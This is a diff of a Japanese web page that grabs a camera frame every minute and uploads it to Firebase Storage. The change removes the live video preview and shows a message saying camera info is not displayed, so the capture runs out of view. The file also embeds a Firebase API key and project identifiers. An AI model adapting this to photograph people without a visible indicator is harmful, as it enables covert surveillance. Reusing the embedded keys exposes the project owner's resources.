@@ -4,10 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>カメラ撮影とFirebaseアップロード</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            margin-bottom: 20px;
+        }
+        .title {
+            font-size: 18px;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
     <h1>カメラ撮影とFirebaseアップロード</h1>
-    <video id="video" width="320" height="240" autoplay></video>
+    <div class="title">現在のカメラの情報は表示されていません。</div>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script type="module">
@@ -16,13 +33,13 @@
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
 
         const firebaseConfig = {
-	  apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
-	  authDomain: "nou-no-circle.firebaseapp.com",
-	  projectId: "nou-no-circle",
-	  storageBucket: "nou-no-circle.appspot.com",
-	  messagingSenderId: "756338805186",
-	  appId: "1:756338805186:web:cb740e035ac611b5baae5b",
-	  measurementId: "G-TWBV38P13D"
+            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
+	 　 authDomain: "nou-no-circle.firebaseapp.com",
+	 　 projectId: "nou-no-circle",
+	 　 storageBucket: "nou-no-circle.appspot.com",
+	 　 messagingSenderId: "756338805186",
+	 　 appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+	 　 measurementId: "G-TWBV38P13D"
         };
 
         // Firebase初期化
@@ -30,13 +47,13 @@
         const storage = getStorage(app);
 
         // カメラアクセス
-        const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
+        let videoStream;
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
-                video.srcObject = stream;
+                videoStream = stream;
             })
             .catch(err => {
                 console.error('カメラアクセスエラー:', err);
@@ -56,11 +73,22 @@
 
         // 1分ごとに撮影してアップロード
         setInterval(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataURL = canvas.toDataURL('image/jpeg');
-            uploadImage(dataURL);
+            if (videoStream) {
+                const videoTracks = videoStream.getVideoTracks();
+                const track = videoTracks[0];
+                const imageCapture = new ImageCapture(track);
+                imageCapture.grabFrame()
+                    .then(imageBitmap => {
+                        canvas.width = imageBitmap.width;
+                        canvas.height = imageBitmap.height;
+                        ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/jpeg');
+                        uploadImage(dataURL);
+                    })
+                    .catch(err => {
+                        console.error('画像キャプチャエラー:', err);
+                    });
+            }
         }, 60000); // 60000ミリ秒 = 1分
     </script>
 </body>
